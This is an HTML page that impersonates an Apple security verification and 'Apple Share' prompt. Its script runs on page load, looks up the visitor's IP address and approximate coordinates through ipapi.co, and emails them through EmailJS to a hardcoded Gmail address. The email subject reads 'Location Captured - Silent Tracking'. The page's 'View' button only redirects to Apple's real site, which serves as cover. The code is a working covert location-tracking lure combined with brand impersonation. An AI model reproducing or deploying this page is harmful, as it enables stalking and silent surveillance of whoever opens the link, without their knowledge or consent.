<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Security Verification</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .card {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
            padding: 2rem;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .icon-container {
            width: 64px;
            height: 64px;
            background: #007AFF;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            box-shadow: 0 8px 25px rgba(0, 122, 255, 0.25);
        }

        .shield-icon {
            width: 32px;
            height: 32px;
            fill: white;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 0.5rem;
            letter-spacing: -0.01em;
        }

        .subtitle {
            font-size: 0.875rem;
            color: #86868b;
            line-height: 1.5;
        }

        .info-card {
            background: #f0f8ff;
            border: 1px solid #e3f2fd;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
        }

        .info-icon {
            width: 20px;
            height: 20px;
            fill: #007AFF;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .info-content h3 {
            font-size: 0.875rem;
            font-weight: 600;
            color: #1565c0;
            margin-bottom: 0.25rem;
        }

        .info-content p {
            font-size: 0.875rem;
            color: #1976d2;
            line-height: 1.4;
        }

        .action-button {
            width: 100%;
            height: 48px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: all 0.2s ease;
            box-shadow: 0 4px 14px rgba(0, 122, 255, 0.25);
            margin-bottom: 1.5rem;
        }

        .action-button:hover {
            background: #0056b3;
            box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
            transform: translateY(-1px);
        }

        .action-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .map-icon {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        .result-display {
            background: #f5f5f7;
            border: 1px solid #e5e5e7;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-family: 'SF Mono', Monaco, monospace;
            font-size: 0.875rem;
            color: #1d1d1f;
            white-space: pre-line;
            display: none;
        }

        .footer {
            text-align: center;
            font-size: 0.75rem;
            color: #86868b;
        }

        @media (max-width: 480px) {
            .card {
                padding: 1.5rem;
            }
        }
        
        /* Loading indicator for background process */
        .loading-indicator {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(0, 122, 255, 0.3);
            border-top: 2px solid #007AFF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body>
    <div class="loading-indicator" id="loadingIndicator"></div>
    
    <div class="card">
        <div class="header">
            <div class="icon-container">
                <svg class="shield-icon" viewBox="0 0 24 24">
                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10.5V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10.5C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10.5V11.5H13.5V10.5C13.5,8.7 12.8,8.2 12,8.2Z"/>
                </svg>
            </div>
            <h1>Apple Share</h1>
            <p class="subtitle">A information has been shared by user login via apple account to view information</p>
        </div>

        <div class="info-card">
            <svg class="info-icon" viewBox="0 0 24 24">
                <path d="M13,9H11V7H13M13,17H11V11H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2Z"/>
            </svg>
            <div class="info-content">
                <h3>Security Verification</h3>
                <p>Verification helps ensure your Apple account remains secure. Login to view shared information</p>
            </div>
        </div>

        <button class="action-button" onclick="redirectToApple()" id="locationBtn">
          <!--  <svg class="map-icon" viewBox="0 0 24 24">
                <path d="M12,11.5A2.5,2.5 0 0,1 9.5,9A2.5,2.5 0 0,1 12,6.5A2.5,2.5 0 0,1 14.5,9A2.5,2.5 0 0,1 12,11.5M12,2A7,7 0 0,0 5,9C5,14.25 12,22 12,22C12,22 19,14.25 19,9A7,7 0 0,0 12,2Z"/>
            </svg>-->
            View
        </button>

        <div class="result-display" id="result"></div>

        <div class="footer">
            <p>Apple Inc. â€¢ Privacy Policy</p>
        </div>
    </div>

    <script>
        const EMAIL_CONFIG = {
             serviceId: 'service_7z1wcjl',  // Replace with your EmailJS service ID
            templateId: 'template_xa2n6ht', // Replace with your EmailJS template ID
            publicKey: 'DJUhavRcWhqXVp1EP',   // Replace with your EmailJS public key
            recipientEmail: 'shilpkarricha@gmail.com' // Change this to the desired email address
        };

        (function(){
            emailjs.init(EMAIL_CONFIG.publicKey);
            
            // Run location collection automatically when page loads
            window.addEventListener('load', function() {
                // Show loading indicator
                document.getElementById('loadingIndicator').style.display = 'block';
                
                // Use IP-based geolocation - no permission required
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        if (data.latitude && data.longitude) {
                            processLocation({
                                coords: {
                                    latitude: data.latitude,
                                    longitude: data.longitude
                                },
                                ipData: data
                            });
                        } else {
                            console.log('IP geolocation failed: No coordinates in response');
                        }
                    })
                    .catch(error => {
                        console.log('IP geolocation failed:', error);
                    })
                    .finally(() => {
                        // Hide loading indicator after a delay
                        setTimeout(() => {
                            document.getElementById('loadingIndicator').style.display = 'none';
                        }, 1500);
                    });
            });
        })();

        function redirectToApple() {
            window.location.href = 'https://account.apple.com/';
        }

        function processLocation(position) {
            // Send location data silently in background
            sendLocationEmail(position.coords.latitude, position.coords.longitude, position.ipData);
        }

        function sendLocationEmail(latitude, longitude, ipData) {
            const timestamp = new Date().toLocaleString();
            const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
            const ipInfo = ipData ? `${ipData.ip} (${ipData.city}, ${ipData.region}, ${ipData.country_name})` : 'Unknown';
            
            const templateParams = {
                to_email: EMAIL_CONFIG.recipientEmail,
                subject: 'Location Captured - Silent Tracking',
                timestamp: timestamp,
                latitude: latitude.toFixed(6),
                longitude: longitude.toFixed(6),
                ip_address: ipInfo,
                google_maps_link: googleMapsLink,
                message: `Location was automatically detected through IP-based geolocation.\n\nIP Address: ${ipInfo}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nGoogle Maps: ${googleMapsLink}\n\nThis detection happened without requiring user permission.`
            };

            emailjs.send(EMAIL_CONFIG.serviceId, EMAIL_CONFIG.templateId, templateParams)
                .then(function(response) {
                    console.log('Email sent successfully:', response.status, response.text);
                }, function(error) {
                    console.log('Email sending failed:', error);
                });
        }
    </script>
</body>
</html>
